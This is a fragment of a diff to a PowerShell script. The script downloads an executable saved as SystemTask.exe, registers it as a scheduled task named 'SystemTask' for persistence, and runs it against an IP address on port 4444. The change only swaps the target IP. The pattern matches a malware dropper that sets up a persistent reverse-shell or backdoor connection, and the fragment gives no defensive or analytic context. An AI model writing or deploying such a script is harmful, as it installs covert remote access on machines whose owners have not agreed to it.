@@ -7,6 +7,6 @@ $file = 'SystemTask.exe'
 $client.DownloadFile($url,$file)
 $command = 'schtasks.exe /create /tn SystemTask /xml SystemTask.xml'
 iex $command
-$command = 'SystemTask.exe 192.168.149.1 4444'
+$command = 'SystemTask.exe 192.168.2.91 4444'
 iex $command
 exit
